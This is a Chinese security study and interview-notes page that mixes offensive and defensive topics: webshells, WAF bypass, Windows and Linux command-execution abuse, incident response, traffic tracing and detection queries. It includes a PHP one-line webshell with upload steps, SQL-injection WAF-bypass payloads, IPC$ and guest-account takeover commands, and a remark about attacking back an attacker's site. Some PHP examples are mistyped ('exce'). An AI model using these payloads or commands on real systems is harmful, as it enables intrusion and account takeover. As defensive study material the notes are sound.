<h2 id="四、WebShell-的利用"><a href="#四、WebShell-的利用" class="headerlink" title="四、WebShell 的利用"></a>四、WebShell 的利用</h2><p>Webshell 是黑客经常使用的一种恶意脚本，其目的是获得对服务器的执行操作权限，比如执行系统命令、窃取用户数据、删除 web  页面、修改主页等。黑客通常利用常见的漏洞，如 SQL 注入、远程文件包含 (RFI)、FTP，甚至使用跨站点脚本攻击 (XSS)  等方式作为社会工程攻击的一部分，最终达到控制网站服务器的目的。</p>
<p>黑客可以用 web 的方式，通过 asp 或 php 木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等。</p>
<p>Webshell 可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制服务器或远程主机交互的数据都是通过 80  端口传递，因此不会被防火墙拦截，在没有记录流量的情况下，Webshell 使用 post 包发送，也不会被记录在系统日志中，只会在 Web  日志中记录一些数据提交的记录。</p>
<ul>
<li><p>WebShell 的分类 ①根据文件大小分类：大马和小马 (通常指的是一句话木马，能够使用菜刀这类工具去直接连接它) ②根据脚本名称分类：jsp、asp、aspx、php</p>
</li>
<li><p>WebShell 的利用</p>
<p>寻找页面上传点</p>
<p>写好一句话木马（上传木马），比如如下的 PHP 一句话木马的代码：</p>
<p><code>_POST['shell']); ?&gt;</code></p>
<p>然后寻找上传后的文件位置（绝对路径），可以用蚁剑、中国菜刀等工具连接到主机进行接下来的操作，比如提权。</p>
</li>
<li><p>WebShell 有哪些特征？</p>
<ul>
<li><p>持久化远程访问</p>
<p>Webshell 脚本通常会包含后门，黑客上传 Webshell 之后，就可以充分利用 Webshell  的后门实现远程访问并控制服务器，从而达到长期控制网站服务器的目的。此外，在上传完 Webshell  之后，黑客会选择自己修复漏洞，以确保没有其他人会利用该漏洞。通过这种方式，黑客就可以一种低调的姿态，避免与管理员进行任何交互，同时仍然获得相同的结果。</p>
</li>
</ul>
</li>
<li><p>提权</p>
<p>在服务器没有配置错误的情况下，Webshell 将在 web 服务器的用户权限下运行，而用户权限是有限的。通过 Webshell，黑客可以利用系统上的本地漏洞来实现权限提升，从而获得  Root 权限，这样黑客基本上可以在系统上做任何事情，包括安装软件、更改权限、添加和删除用户、窃取密码、阅读电子邮件等等。</p>
</li>
<li><p>隐藏性极强</p>
<p>Webshell 可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制服务器或远程主机交互的数据都是通过 80  端口传递，因此不会被防火墙拦截，在没有记录流量的情况下，Webshell 使用 post 包发送，也不会被记录在系统日志中，只会在 Web  日志中记录一些数据提交的记录。</p>
</li>
<li><p>WebShell 常用的 PHP 函数</p>
<p>Webshell 几乎适用于所有 Web 编程语言。之所以关注 PHP，是因为它是 web 上使用最广泛的编程语言。下面是 PHP 中一些执行 shell 命令最常用的函数。</p>
<ul>
<li><p>system()</p>
<p>system () 函数将命令作为参数，并输出结果。</p>
<p>下面的示例是在 Windows 操作系统上运行 dir 命令，然后返回 PHP 文件所在目录的目录列表。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
    echo system('ls -al');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ul>
</li>
</ul>
<p>exec()</p>
<p>exec () 功能是将命令作为参数，但不输出结果。</p>
<p>如果指定了第二个可选参数，则返回结果为数组。否则，如果回显，只显示结果的最后一行。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
    echo exce('ls -al');
    echo exce('ls -al',$array);
    var_dump($array);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>shell_exec()</p>
<p>shell_exec () 函数类似于 exec ()，但是，其整个输出结果为字符串。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
    echo shell_exce('ls -al');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>passthru()</p>
<p>passthru () 执行一个命令并返回原始格式的输出。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
    echo passthru('ls -al');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li><p>proc_open()</p>
<p>proc_open () 可以创建一个处理程序（流程），实现脚本和要运行的程序之间的通信。</p>
</li>
<li><p>倒引号</p>
<p>PHP 会首先执行 shell 命令中倒引号（`）内的内容</p>
<h3 id="三、一句话木马白名单绕过："><a href="#三、一句话木马白名单绕过：" class="headerlink" title="三、一句话木马白名单绕过："></a>三、一句话木马白名单绕过：</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175233624.png" alt="image-20230731175233624"></p>
</li>
</ul>
<h2 id="四、WAF"><a href="#四、WAF" class="headerlink" title="四、WAF"></a>四、WAF</h2><p>WAF 设备：绿盟 / 深信服 / 启明星辰 / 360 / 阿里云 WAF / 安全狗等</p>
<p>WAF 通过一组通常称为策略的规则运行。这些策略旨在通过过滤掉恶意流量来防止应用程序中的漏洞。WAF 的价值部分来自于实施策略修改的速度和便利性，从而可以更快地响应不同的攻击向量；在 DDoS 攻击期间，可以通过修改 WAF 策略快速实现限速。</p>
<p>** 三种 WAF ** 实现基于网络的 WAF 通常是基于硬件的。</p>
<ul>
<li><p>由于它们是在本地安装的，因此可以最大限度地减少延迟，但基于网络的 WAF 是最昂贵的选择，并且还需要存储和维护物理设备。  </p>
<p>代表产品有：Imperva、天清 WAG 等。</p>
</li>
<li><p>基于主机的 WAF 可以完全集成到应用程序的软件中。</p>
<p>此解决方案比基于网络的 WAF 更便宜，并且提供更多的可定制性。基于主机的 WAF 的缺点是消耗本地服务器资源、实施复杂性和维护成本，这些组件通常需要占用大量资源和时间。</p>
<p>代表产品：安全狗，云锁，D 盾等。  </p>
</li>
<li><p>基于云的 WAF 是一种云防火墙。</p>
<p>他们通常提供交钥匙安装，就像更改 DNS 以重定向流量一样简单。基于云的 WAF 还具有最低的前期成本，因为用户每月或每年为安全即服务付费。基于云的 WAF  还可以提供持续更新的解决方案，以抵御最新的威胁，而无需在用户端进行任何额外的工作或成本。基于云的 WAF 的缺点是用户将责任移交给第三方，因此  WAF 的某些功能对用户来说可能是一个黑匣子。  </p>
<p>代表产品有：阿里云云盾，腾讯云 WAF 等。</p>
</li>
</ul>
<p><strong>WAF 的工作原理？</strong></p>
<p>WAF 的处理流程大致可分为四部分：预处理、规则检测、处理模块、日志记录</p>
<ul>
<li><p>预处理</p>
<p>预处理阶段首先在接收到数据请求流量时会先判断是否为 HTTP/HTTPS 请求，之后会查看此 URL 请求是否在白名单之内，如果该 URL 请求在白名单列表里，直接交给后端 Web 服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。</p>
</li>
<li><p>规则检测</p>
<p>每一种 WAF 产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。</p>
</li>
<li><p>处理模块</p>
<p>针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端 Web 服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。不同的 WAF  产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款 WAF 产品，从而有目的性的进行 WAF 绕过。</p>
</li>
<li><p>日志记录</p>
<p>WAF 在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。</p>
</li>
</ul>
<p><strong>绕 WAF 的多种方式</strong></p>
<ul>
<li><p>字母大小写混合绕过</p>
<p>原因：服务器端检测时未开启大小写不敏感</p>
<p>形式：<code>UnIon SeLecT</code></p>
</li>
<li><p>多重关键字</p>
<p>原因：服务器端检测到敏感字符时替换为空 </p>
<p>形式：<code>ununionion selselectect</code></p>
</li>
<li><p>注释</p>
<p>原因：服务器端未检测或检测不严注释内的字符串 </p>
<p>形式：<code>/**/，/*!*/，/*!12345*/，#，-- -</code> 等</p>
</li>
<li><p>编码绕过</p>
<p>原因：服务器端未检测或检测不严具有编码形式的关键字 </p>
<p>类型：十六进制编码、URL 编码、Unicode 编码 </p>
<p>形式：<code>0x61646d696e、%20、%u0020</code></p>
</li>
<li><p>等价函数或命令</p>
<p>原因：服务器端黑名单不完整，过滤不严 </p>
<p>形式： </p>
<p>Mysql 查询：<code>Union distinct、updatexml、Extractvalue、floor</code> </p>
<p>字符串截取函数：<code>mid、substr、substring、left、reverse </code></p>
<p>字符串连接函数：<code>concat、group_concat、concat_ws </code></p>
<p>字符串转换：<code>char、hex、unhex</code> </p>
<p>替换逗号：<code>limit 1 offset 0，mid(version() from 1 for 1) </code></p>
<p>替换等号：<code>like</code></p>
</li>
<li><p>组合绕过</p>
<p>原因：服务器端检测多处位置，需要多重绕过方式组合使用 </p>
<p>形式：<code>id = 1’ and/**/’1’like’2’/**//*!12345union*/select 1,2,3</code></p>
</li>
<li><p>特殊字符</p>
<p>原因：数据库中效果相同，服务器端却没有限制 </p>
<p>形式：</p>
<p>科学记数法 <code>and 1e0 = 1e0 </code></p>
<p>空白字符 <code>%0a %a0 %0b %20 %09 </code></p>
<p>反单引号 <code>table_name</code> </p>
<p>括号 <code>select * from (test.admin)</code></p>
</li>
</ul>
<h2 id="四、linux应急响应常用命令（T1）："><a href="#四、linux应急响应常用命令（T1）：" class="headerlink" title="四、linux应急响应常用命令（T1）："></a>四、linux应急响应常用命令（T1）：</h2><h3 id="1-系统排查"><a href="#1-系统排查" class="headerlink" title="1.系统排查"></a>1.系统排查</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180655883.png" alt="image-20230731180655883"></p>
<h3 id="2-进程排查"><a href="#2-进程排查" class="headerlink" title="2.进程排查"></a>2.进程排查</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731181123128.png" alt="image-20230731181123128"></p>
<h3 id="3-服务排查"><a href="#3-服务排查" class="headerlink" title="3.服务排查"></a>3.服务排查</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731181528422.png" alt="image-20230731181528422"></p>
<h3 id="4-日志分析"><a href="#4-日志分析" class="headerlink" title="4.日志分析"></a>4.日志分析</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731181640388.png" alt="image-20230731181640388"></p>
<h3 id="5-查看登陆成功日期、用户名、IP地址的命令"><a href="#5-查看登陆成功日期、用户名、IP地址的命令" class="headerlink" title="5.查看登陆成功日期、用户名、IP地址的命令"></a>5.查看登陆成功日期、用户名、IP地址的命令</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731181844954.png" alt="image-20230731181844954"></p>
<h2 id="四、windows应急响应常用命令（T1）："><a href="#四、windows应急响应常用命令（T1）：" class="headerlink" title="四、windows应急响应常用命令（T1）："></a>四、windows应急响应常用命令（T1）：</h2><h3 id="1-系统账户相关"><a href="#1-系统账户相关" class="headerlink" title="1.系统账户相关"></a>1.系统账户相关</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182023367.png" alt="image-20230731182023367"></p>
<h3 id="2-进程端口相关"><a href="#2-进程端口相关" class="headerlink" title="2.进程端口相关"></a>2.进程端口相关</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182243135.png" alt="image-20230731182243135"></p>
<h3 id="3-启动项，计划任务，服务"><a href="#3-启动项，计划任务，服务" class="headerlink" title="3.启动项，计划任务，服务"></a>3.启动项，计划任务，服务</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182316866.png" alt="image-20230731182316866"></p>
<h3 id="4-日志目录"><a href="#4-日志目录" class="headerlink" title="4.日志目录"></a>4.日志目录</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182405270.png" alt="image-20230731182405270"></p>
<h2 id="三、Winodws-命令执行漏洞"><a href="#三、Winodws-命令执行漏洞" class="headerlink" title="三、Winodws 命令执行漏洞"></a>三、Winodws 命令执行漏洞</h2><p>Windows 命令执行漏洞，就是在 Winodws 环境下存在的命令执行漏洞，通过相关的漏洞验证方法确认了存在命令执行漏洞后，我们可以使用 Windows 环境下的一些命令去对漏洞进行利用。</p>
<ul>
<li>通过涉及到主机探测、扫描、路由、协议、远程、进程、端口、服务等常见的 Windows 的命令</li>
<li>如果我们的服务器是一台 Windows 操作系统，存在着命令执行漏洞</li>
<li>我们就可以通过上面的这些漏洞进行命令执行的操作 </li>
<li>对 Windows 服务器系统进行扫描探测、进行进程和服务管理、进行内网渗透、服务器提限等</li>
</ul>
<h3 id="Windows-命令执行漏洞利用"><a href="#Windows-命令执行漏洞利用" class="headerlink" title="Windows 命令执行漏洞利用**"></a>Windows 命令执行漏洞利用**</h3><p>通过以上的学习我们知道了 Windows 下的命令执行漏洞的原理以及一些利用方法，下面将列出常用到的 Windows 命令，可以利用到 Windows 命令执行的漏洞当中去。</p>
<ul>
<li>ipconfig /all 查看网络连接</li>
<li>net use \ip\ipc$ “” /user:” “    建立 IPC 空链接</li>
<li>net use \ip\ipc$ “密码” /user:”用户名” 建立 IPC 非空链接</li>
<li>net use h: \ip\c$ “密码” /user:”用户名” 直接登陆后映射对方 C：到本地为 H:</li>
<li>net use h: \ip\c$ 登陆后映射对方 C：到本地为 H:</li>
<li>net use \ip\ipc$ /del 删除 IPC 链接</li>
<li>net use h: /del 删除映射对方到本地的为 H: 的映射</li>
<li>net user guest /active:yes 激活 guest 用户</li>
<li>net user guest 12345 用 guest 用户登陆后用将密码改为 12345</li>
<li>echo 信息 &gt;&gt; pass.txt 将 “信息” 保存到 pass.txt 文件中</li>
</ul>
<h2 id="三、Linux-命令执行漏洞"><a href="#三、Linux-命令执行漏洞" class="headerlink" title="三、Linux 命令执行漏洞"></a>三、Linux 命令执行漏洞</h2><ul>
<li>Linux 命令执行漏洞，就是在 Linux 服务器上存在的命令执行下漏洞</li>
<li>Linux 命令执行漏洞相对于 Windows 命令执行漏洞来说，利用起来更加的容易</li>
<li>因为 Linux 的一些操作本省就是需要通过一些命令去进行管理和执行</li>
</ul>
<p>命令在 Linux 中的执行分为 4 步：判断路径、检查别名、判断内外部、路径查找文件</p>
<h3 id="Linux-命令执行漏洞利用"><a href="#Linux-命令执行漏洞利用" class="headerlink" title="Linux 命令执行漏洞利用"></a>Linux 命令执行漏洞利用</h3><ul>
<li>Linux 系统下基本命令，我们注意这些命令要区分大小写</li>
<li>通过这些命令我们可以对 Linux 下的命令执行漏洞进行利用</li>
<li>包括系统、资源、进程、网络、用户、服务等常见的 Linux 系统命令</li>
</ul>
<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="三、说一下你的漏洞挖掘经历："><a href="#三、说一下你的漏洞挖掘经历：" class="headerlink" title="三、说一下你的漏洞挖掘经历："></a>三、说一下你的漏洞挖掘经历：</h2><p>挖的edu，找到个水平越权，直接改id=什么就好</p>
<h2 id="四、日志的关注点"><a href="#四、日志的关注点" class="headerlink" title="四、日志的关注点"></a>四、日志的关注点</h2><p><strong>1、异常时间段登录</strong></p>
<p>比如半夜一两点三四点，有事件 ID4624 产生，服务器有异常登录，开启下列排查，并修改远程桌面密码，尝试溯源。</p>
<p><strong>2、系统安全日志</strong>，针对服务器。</p>
<p><strong>3、windows 安全日志（</strong>系统安全日志的一种），</p>
<p><strong>4、关于远程桌面登录的记录</strong>，</p>
<p>成功和失败事件类型和 ID</p>
<p>远程登录成功，和管理员确定是非管理员操作，基本判定是失陷</p>
<p>远程登录不成功，需要检查谁在登录，如何去禁止登录</p>
<p>（1）内网，检查谁在登录，并且定位 IP 进行排查（内网已经失陷）</p>
<p>（2）外网，封禁 IP 或关闭远程服务。</p>
<h2 id="四、常见取证分析工具"><a href="#四、常见取证分析工具" class="headerlink" title="四、常见取证分析工具"></a>四、常见取证分析工具</h2><p>wireshark</p>
<p>xplico</p>
<p>volatility</p>
<p>fastlr collector</p>
<p>autopsy</p>
<p>dumolt</p>
<p>ftk lmager</p>
<p>foremost</p>
<p>scalpel</p>
<p>bulik_exetractor</p>
<h2 id="四、流量分析溯源思路"><a href="#四、流量分析溯源思路" class="headerlink" title="四、流量分析溯源思路"></a>四、流量分析溯源思路</h2><p>假设发现 web 应用服务器发现文件异常增多，初步怀疑被上传 webshell，描述流量分析溯源的思路</p>
<p>可利用流量工具进行溯源：</p>
<p>1、查看 eval、z0、shell、whoami 等关键字，查看出现次数过多的时候，可能 需要查看是哪个页面发起的请求，有可能是 webshell </p>
<p>2、通过 WireShark 工具快速搜索关键字，定位到异常流量包 </p>
<p>3、找出异常 IP 和所上传的内容，查看是否为 webshell </p>
<h2 id="四、定位到攻击-IP"><a href="#四、定位到攻击-IP" class="headerlink" title="四、定位到攻击 IP"></a>四、定位到攻击 IP</h2><p>1、 首先通过选择 - 统计 - 对话查看流量的走向情况，定位可疑的 IP 地址 </p>
<p>2、 根据定位到的 IP 地址，尝试对上传的 webshell 进行定位 ip.addr ==ip &amp;&amp;http matches “uploadleval|select|xp_cmdshell”&amp;&amp; http.request.method ==  “POST” </p>
<p>3、 查找到 Webshell 后尝试溯源漏洞位置，http.request.uri contains“webshell.php”，定位到最开始 webshell 执行或上传的时候 </p>
<p>4、 根据最开始的 HTTP 上传包或者其他漏洞特产定位漏洞类型</p>
<h2 id="四、ip溯源办法："><a href="#四、ip溯源办法：" class="headerlink" title="四、ip溯源办法："></a>四、ip溯源办法：</h2><p>如果是代理就没意义，如果不是代理反查域名绑定，拿信息，丢裤子里，如果是个<br>web，就打回去拿信息</p>
<h2 id="四、有没有用过设备："><a href="#四、有没有用过设备：" class="headerlink" title="四、有没有用过设备："></a>四、有没有用过设备：</h2><p>奇安信的天眼、WAF 、蜜罐、绿盟态势感知、防火墙、IDS（入侵检测系统）、IPS（入侵防御系统），中睿的睿眼，他会自动匹配可能是攻击的数据包，然后通过数据包判断是否是攻击。</p>
<p>天眼的全称是奇安信新一代安全感知系统，它以攻防渗透和数据分析为核心竞争力，聚焦威胁检测和响应，为安全服务和分析人员提供一套在监测预警、威胁检测、溯源分析和响应处置上得心应手的威胁检测平台。</p>
<ul>
<li><p>天眼三大功能：</p>
<p>传感器（对流量解析还原，发现网络攻击和 web 攻击能力） </p>
<p>沙箱（发现恶意样本投递能力）</p>
<p>分析平台（存储历史流量，分析威胁和溯源能力）  </p>
</li>
<li><p>天眼使用：</p>
<p>天眼威胁感知： 警告类型：APT 攻击   威胁级别：高危   攻击结果：失陷    攻击次数：3 </p>
<p>天眼搜索：源 IP sip   目的 IP dip  地理信息：境内还是境外   </p>
<p>搜索示例:（sip:”192.168.1.1”）OR（dip:”192.168.1.1”）  </p>
<p>天眼类别：威胁感知调查分析 场景化分析</p>
<p>日志检索：例子：search sip:”10.1.1.1/8” |tcp 100 dip 资产 报表 安全服务  系统管理</p>
</li>
<li><p>天眼分析：</p>
<p>爆破和踩点行为分析：</p>
<p>登录爆破类：单个IP，使用多个用户名和密码组合进行登录尝试，导致短时间内大量登录失败<br>目录和资源爆破：短时间内访问大量url，触发大量404<br>手段：</p>
<p>1.找到爆破行为IP，阻断爆破行为    </p>
<p>2.找到攻击成功的IP   </p>
<p>3.分析攻击IP的操作，编写事件报告</p>
<p>ftp 爆破：</p>
<pre class="line-numbers language-none"><code class="language-none">日志检索使用天眼语法搜索爆破IP：normal_ret:failed AND proto:ftp
判断爆破成功行为：normal_ret:success  AND proto:ftp AND sip:(攻击ip1 OR 攻击ip2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ssh 爆破：</p>
<pre class="line-numbers language-none"><code class="language-none">日志检索使用天眼语法搜索爆破IP：normal_ret:failed AND proto:ssh
判断爆破成功行为：normal_ret:success AND proto:ssh AND sip(攻击ip1 OR 攻击ip2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>数据库爆破：</p>
<pre class="line-numbers language-none"><code class="language-none">normal_ret:failed AND proto:(oracle OR mysql OR mssql OR postgresql)
normal_ret:success AND proto:(oracle OR mysql OR mssql OR postgresql) AND sip:(攻击IP1 OR 攻击IP2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>远程桌面爆破：</p>
<pre class="line-numbers language-none"><code class="language-none">normal_ret:failed AND proto:rdp
normal_ret:success AND proto:rdp AND sip:(攻击IP1 OR 攻击IP2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>web 登录入口爆破：</p>
<pre class="line-numbers language-none"><code class="language-none">对弱口令就行分析：uri:爆破路径 AND sip:攻击ip，查找爆破的流量日志<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>目录和资源猜解：</p>
<pre class="line-numbers language-none"><code class="language-none">根据域名和攻击ip进行分析：host:域名 AND sip:攻击IP，查询攻击IP的访问记录是否触发大量404响应<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>天眼失陷事件处理：</p>
<p>1、web攻击分析思路：<br>web攻击：查看请求包 与 响应包（有没有报红，有没有攻击成功）<br>查看告警详情（查看请求头、请求体内容，定位到告警攻击动作的payload）<br>分析攻击动作是什么（读取文件、打印输出内容、写入文件和尝试下载文件，执行函数或命令 XSS  XXE webshell等）<br>分析响应（分析告警响应头，响应体，网络行为是否有动作预期的结果）  </p>
<p> 发现 webshell 和主机木马： 确认创建时间、功能分析等，查看访问日志，攻击行为记录等，通知主机所属人 对发现的 webshell 文件或木马进行排查处置</p>
</li>
</ul>
<h2 id="四、一个登录框可以怎么测试："><a href="#四、一个登录框可以怎么测试：" class="headerlink" title="四、一个登录框可以怎么测试："></a>四、一个登录框可以怎么测试：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182915977.png" alt="image-20230731182915977"></p>
<h2 id="四、数据库提权思路："><a href="#四、数据库提权思路：" class="headerlink" title="四、数据库提权思路："></a>四、数据库提权思路：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731183520438.png" alt="image-20230731183520438"></p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731183550241.png" alt="image-20230731183550241"></p>
<h2 id="四、如果有1w条告警怎么办："><a href="#四、如果有1w条告警怎么办：" class="headerlink" title="四、如果有1w条告警怎么办："></a>四、如果有1w条告警怎么办：</h2><p>样本降噪，看200，找有没有外联的东西，打进来肯定是要干点什么的，看命令执行，看ip。</p>
<h2 id="四、普通的加固手段"><a href="#四、普通的加固手段" class="headerlink" title="四、普通的加固手段"></a>四、普通的加固手段</h2><p>普通的加固手段包括以下几种：</p>
<ol>
<li>更新补丁：定期更新操作系统、应用程序的补丁，修复已知的漏洞和安全问题。</li>
<li>强化口令策略：采用复杂、难以猜测的密码，并进行定期更换。同时可以启用账户锁定、多次失败尝试限制等功能，提高口令安全性。</li>
<li>加强身份验证：采用多因素身份验证技术，例如使用硬件令牌、生物特征等方式，确保只有授权用户才能访问系统。</li>
<li>安装防病毒软件：安装并及时更新防病毒软件，定期进行全盘扫描和实时监控，以便及时发现和处置潜在的恶意软件。</li>
<li>关闭不必要服务：关闭系统中不必要的服务和端口，降低攻击面，避免被利用。</li>
<li>限制访问权限：根据业务需要，设置合理的访问权限，对于未授权的用户或者设备进行限制，提高系统的安全性。</li>
<li>数据备份与恢复：定期备份重要数据，并将其存储在安全可靠的位置。在出现故障或事件时，能够快速恢复数据，避免数据丢失和系统停机。</li>
</ol>
<p>总之，以上这些普通的加固手段可以帮助提高系统的安全性和稳定性，并且也是网络安全基础建设的关键步骤。在实际操作中，需要根据具体情况和需求，结合其他安全措施来进行综合加固。同时需要注意及时更新和检查，以确保系统始终处于安全状态。</p>
<h2 id="四、一些常用工具汇总"><a href="#四、一些常用工具汇总" class="headerlink" title="四、一些常用工具汇总"></a>四、一些常用工具汇总</h2><ul>
<li>威胁情报平台</li>
</ul>
<pre class="line-numbers language-BASH" data-language="BASH"><code class="language-BASH">https://x.threatbook.cn/ 微步在线威胁情报社区
https://ti.qianxin.com/ 奇安信威胁情报中心
https://ti.360.cn/ 360威胁情报中心
https://www.venuseye.com.cn/  
VenusEye威胁情报中心<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>域名反查</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">站长之家IP查询网址：https://ip.tool.chinaz.com/ipbatch
IP138查询网：https://www.ip138.com/
高精度IP定位：https://www.opengps.cn/Data/IP/LocHighAcc.aspx
IP信息查询：https://www.ipip.net/ip.html/
IP地址查询在线工具：https://tool.lu/ip/
多地Ping检测：http://ping.chinaz.com/
Whois查询：https://whois.chinaz.com/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>ip 定位网站</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">https://www.opengps.cn/Data/IP/ipplus.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>在线子域名查询</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">https://phpinfo.me/domain/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>网站指纹识别</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">在线cms识别小插件：http://whatweb.bugscaner.com/look/
wahtweb（需要安装）：https://github.com/urbanadventurer/WhatWeb
云悉指纹：yunsee.cn-2.0
参考链接：
https://blog.csdn.net/qq_41755666/article/details/123614559
https://blog.csdn.net/zsw15841822890/article/details/115774385
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="三、关注那些重点事件日志？"><a href="#三、关注那些重点事件日志？" class="headerlink" title="三、关注那些重点事件日志？"></a>三、关注那些重点事件日志？</h2><p>高级别的演练持续时间为两到三周，进入中后期，人倦马乏，很容易进入懈怠疏漏。其实，攻击方的比拼在演练中段已经进入焦灼状态，大比分在此时拉开。防守方也需要加强投入，在中后期更需要关注一些重点事件，及时发现包括 0day、新增外联、内网异常行为之类的风险。攻击方此时会亮出各家压箱底的武器，0day  的使用和针对防护设备的变形绕过都是常态，不排除现有的防护设备和系统暂时  “失明”，难以全面覆盖到攻击链的每一个点，这时，在日志中发现蛛丝马迹，找到关键重点事件就极有意义。这些重点事件类型包括：</p>
<p><strong>1、异常属性类</strong></p>
<p>考虑到攻方可能将扫描器和 C2 服务器部署在个人 VPS 上，而这些 VPS 极有可能是个人购买的云服务。在攻击日志分析时，对于 IP  归属地是国内外的云服务商的情况都需要加以关注。有的攻击方会在深夜乘防守方警惕性降低时进行攻击尝试，因此半夜出现的新增攻击日志源，也值得警惕。</p>
<p>攻击源 IP 的时间属性也有一定价值，如果某个源 IP 只在攻防演练开始之才出现日志，而之前并未出现过攻击行为，很可能来自于演练攻击方。单纯从攻击日志的各类属性特点来分析日志，也能起到一定作用，当然以上方法结合分析，效果更好。</p>
<p>NOD（Newly Observed Domain），域名也是可疑的观察对象之一。在演练前突然新增的域名，极有可能是攻击方为活动前做的准备。对于这类 NOD  域名可以提前分析获取，加入关注名单。一旦产生类似的外联日志，哪怕原有的情报和态势系统没有告警，也建议马上行动，展开失陷资产排查，并向前溯源，最大程度的还原攻击路径。</p>
<p><strong>2、木马连接类</strong></p>
<p>Webshell  连接工具，包括老式的大马，小马，菜刀，及各类新式的冰蝎，哥斯拉，天蝎，内存马等，特点是倾向于加密的通信，让传统检测设备无法发现行踪。在防守方的日常检测中，一旦发现木马远控连接工具，包括 Cobalt Strike 的命令下发流量（HTTP 协议）和证书指纹规则（HTTPS 协议），MSF 自带木马 Meterpreter  及各类开源远控等的痕迹，以及这些工具通信流量产生的日志都需要警醒，这预示着内网已有机器失陷。部分工具的加密流量通信单纯靠某条规则无法检测，可能需要多模块综合研判以及 AI 分析模块协助处理。所以除了攻击日志，还需要将 AV、情报、AI 研判模块产生的日志一并纳入检测分析范围。</p>
<p><strong>3、代理隧道类</strong></p>
<p>在获取权限后，攻击方通常会使用代理工具搭建隧道进入内网，以获得稳定的控制权限。一旦出现代理隧道的日志，也说明形势较为危急，预示着攻击方可能已经打入内网。这些代理类日志包括 SOCKS 的反向代理（Earthworm、FRP、dtunnel_lite 等）、Reduh、Regeorg 等各类 web  代理隧道。传统设备如 IPS  的先验规则只能检测到明文代理流量，新华三安全设备特意基于代理隧道进行了专项覆盖，对于以上代理可以最大程度的识别，加密的隧道，可以在协商阶段尽早识别。</p>
<p><strong>4、横向扫描类</strong></p>
<p>利用代理隧道进入内网的攻击方，可能通过 Ladon 等工具进行网段、端口、服务的探测，以及使用爆破，撞库的方式进行内网密码破解。因此由内网 IP 发起的扫描探测日志如果被部署在内网的安全设备检测上报，那么这些日志也是非常值得关注的。</p>
<p>这几类重点事件的日志，一般表明有系统被攻陷，因此这些规则需要在演练之前保持开启状态，且演练期间关注级别很高，即使出现的日志条数只有一条，也要优先介入分析。这也对防守方攻防基础提出了一定的要求，初级防守方人员可以联动后台攻防实验室进行有效协同，中高级守方人员可以在实战中进行攻击负载和技战法的总结，形成经验智库。</p>
<p><strong>5、补充</strong></p>
<p>现场分析人员若对某条攻击日志的具体含义持疑，无法判定攻击源 IP 是否恶意时，可以结合该源 IP 和该事件的其他相关日志进行辅助分析，通过绘制力导向图，来判断该 IP 的攻击意图。</p>
<ul>
<li>OA:（重点）泛微，致远，金蝶，蓝凌，万户，金和或者自研发系统 OA，财务系统</li>
<li>ERP:（重点）Microsoft Dynamics GP，Oracle JD Edwards EnterpriseOne，金蝶 - U9，用友 - K/3, 神舟数码 - 易助，SAP ERP，Infor M3</li>
